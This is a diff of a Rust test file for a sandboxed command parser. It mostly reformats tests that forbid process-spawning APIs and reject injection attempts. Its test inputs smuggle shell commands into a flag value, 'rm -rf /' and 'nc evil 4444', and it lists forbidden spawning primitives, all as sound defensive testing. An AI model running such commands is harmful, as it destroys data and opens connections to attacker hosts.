@@ -1,6 +1,6 @@
-use fslite_command::lexer::{tokenize, LexError};
-use fslite_command::parser::parse;
 use fslite_command::Command;
+use fslite_command::lexer::{LexError, tokenize};
+use fslite_command::parser::parse;
 
 /// Structural guard: the parser must never shell out. If someone later
 /// "helpfully" adds a fallback to `std::process::Command` for an
@@ -31,7 +31,13 @@ fn crate_source_never_references_process_command() {
 #[test]
 fn crate_source_never_references_other_process_spawning_primitives() {
     let src_dir = concat!(env!("CARGO_MANIFEST_DIR"), "/src");
-    let forbidden = ["std::process::", "Stdio", "libc::system", "libc::exec", "nix::unistd::exec"];
+    let forbidden = [
+        "std::process::",
+        "Stdio",
+        "libc::system",
+        "libc::exec",
+        "nix::unistd::exec",
+    ];
     for entry in walk(src_dir) {
         let contents = std::fs::read_to_string(&entry).unwrap();
         for needle in forbidden {
@@ -85,7 +91,8 @@ fn malicious_looking_inputs_never_panic_and_never_expand() {
     for input in corpus {
         // The only acceptable outcomes are Ok(_) or Err(_) — a panic here
         // is the test failure.
-        let _ = std::panic::catch_unwind(|| parse(input)).unwrap_or_else(|_| panic!("parse panicked on: {input}"));
+        let _ = std::panic::catch_unwind(|| parse(input))
+            .unwrap_or_else(|_| panic!("parse panicked on: {input}"));
     }
 }
 
@@ -157,8 +164,17 @@ fn multi_megabyte_line_is_rejected_fast() {
     let start = std::time::Instant::now();
     let result = tokenize(&huge);
     let elapsed = start.elapsed();
-    assert_eq!(result.unwrap_err(), LexError::TooLong { max: fslite_command::lexer::MAX_LINE_LEN, actual: huge.len() });
-    assert!(elapsed < std::time::Duration::from_millis(50), "length check should be near-instant, took {elapsed:?}");
+    assert_eq!(
+        result.unwrap_err(),
+        LexError::TooLong {
+            max: fslite_command::lexer::MAX_LINE_LEN,
+            actual: huge.len()
+        }
+    );
+    assert!(
+        elapsed < std::time::Duration::from_millis(50),
+        "length check should be near-instant, took {elapsed:?}"
+    );
 }
 
 /// Deeply nested/repeated quote characters must produce a clean parse
@@ -168,7 +184,10 @@ fn multi_megabyte_line_is_rejected_fast() {
 fn pathological_quote_repetition_terminates_cleanly() {
     let input = format!("write /a.txt --text={}", "'".repeat(100_000));
     let result = std::panic::catch_unwind(|| tokenize(&input));
-    assert!(result.is_ok(), "tokenizer should not panic on repeated quote characters");
+    assert!(
+        result.is_ok(),
+        "tokenizer should not panic on repeated quote characters"
+    );
 }
 
 /// Companion to the above: an *alternating* single/double quote chain
@@ -178,13 +197,21 @@ fn pathological_quote_repetition_terminates_cleanly() {
 /// evolves, not just the absence of a panic/stack overflow.
 #[test]
 fn alternating_quote_chain_terminates_cleanly_and_fast() {
-    let chain: String = (0..50_000).map(|i| if i % 2 == 0 { '\'' } else { '"' }).collect();
+    let chain: String = (0..50_000)
+        .map(|i| if i % 2 == 0 { '\'' } else { '"' })
+        .collect();
     let input = format!("write /a.txt --text={chain}");
     let start = std::time::Instant::now();
     let result = std::panic::catch_unwind(|| tokenize(&input));
     let elapsed = start.elapsed();
-    assert!(result.is_ok(), "tokenizer should not panic on an alternating quote chain");
-    assert!(elapsed < std::time::Duration::from_millis(200), "alternating quote chain should not be quadratic, took {elapsed:?}");
+    assert!(
+        result.is_ok(),
+        "tokenizer should not panic on an alternating quote chain"
+    );
+    assert!(
+        elapsed < std::time::Duration::from_millis(200),
+        "alternating quote chain should not be quadratic, took {elapsed:?}"
+    );
 }
 
 /// Task 3's real, verified bug was an *empty* quoted segment (`''`/`""`)
@@ -217,7 +244,11 @@ fn adjacent_non_empty_quoted_segments_still_reject_a_trailing_metacharacter() {
 /// absorbed as part of the flag's value.
 #[test]
 fn metacharacter_immediately_after_inline_flag_equals_is_rejected() {
-    for input in ["write /a.txt --text=;rm -rf /", "write /a.txt --text=foo;rm -rf /", "write /a.txt --text=foo|nc evil 4444"] {
+    for input in [
+        "write /a.txt --text=;rm -rf /",
+        "write /a.txt --text=foo;rm -rf /",
+        "write /a.txt --text=foo|nc evil 4444",
+    ] {
         match parse(input) {
             Err(_) => {}
             Ok(command) => panic!("expected rejection for {input:?}, got {command:?}"),
@@ -293,7 +324,10 @@ fn even_and_odd_length_quote_runs_behave_predictably() {
         other => panic!("expected an even quote run to close cleanly, got {other:?}"),
     }
 
-    assert_eq!(tokenize(&format!("write /a.txt --text={}", "'".repeat(11))), Err(LexError::UnterminatedQuote));
+    assert_eq!(
+        tokenize(&format!("write /a.txt --text={}", "'".repeat(11))),
+        Err(LexError::UnterminatedQuote)
+    );
 }
 
 /// Many non-empty quoted segments concatenated back-to-back with no
@@ -313,7 +347,10 @@ fn long_chain_of_touching_non_empty_quoted_segments_assembles_correctly_and_fast
         Command::Write { bytes, .. } => assert_eq!(bytes, "x".repeat(10_000).into_bytes()),
         other => panic!("expected Write, got {other:?}"),
     }
-    assert!(elapsed < std::time::Duration::from_millis(200), "took {elapsed:?}");
+    assert!(
+        elapsed < std::time::Duration::from_millis(200),
+        "took {elapsed:?}"
+    );
 
     // Same chain, this time with a trailing unquoted metacharacter and no
     // space — must still be rejected, not silently absorbed after 10,000
